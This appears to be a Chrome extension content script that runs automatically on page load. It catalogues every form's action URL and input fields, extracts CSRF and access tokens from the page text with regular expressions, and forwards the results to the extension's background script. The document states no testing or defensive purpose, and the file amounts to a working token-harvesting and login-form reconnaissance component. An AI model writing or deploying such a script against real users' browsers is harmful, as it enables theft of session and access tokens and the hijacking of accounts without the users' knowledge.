function extractData() {
    let data = {};
  
    // Extract login forms and parameters
    let forms = document.querySelectorAll('form');
    forms.forEach(form => {
      let action = form.action;
      let inputs = form.querySelectorAll('input');
      let formData = {};
  
      inputs.forEach(input => {
        let name = input.name;
        let type = input.type;
        if (name) {
          formData[name] = type;
        }
      });
  
      if (Object.keys(formData).length > 0) {
        data[action] = formData;
      }
    });
  
    // Extract tokens (example patterns)
    let bodyText = document.body.innerText;
    let csrfTokenMatch = bodyText.match(/csrf_token=([a-zA-Z0-9_-]+)/);
    let accessTokenMatch = bodyText.match(/"access_token":"([a-zA-Z0-9_-]+)"/);
  
    if (csrfTokenMatch) {
      data['csrf_token'] = csrfTokenMatch[1];
    }
    if (accessTokenMatch) {
      data['access_token'] = accessTokenMatch[1];
    }
  
    // Send data to background script
    chrome.runtime.sendMessage({action: 'saveData', data: data});
  }
  
  extractData();
  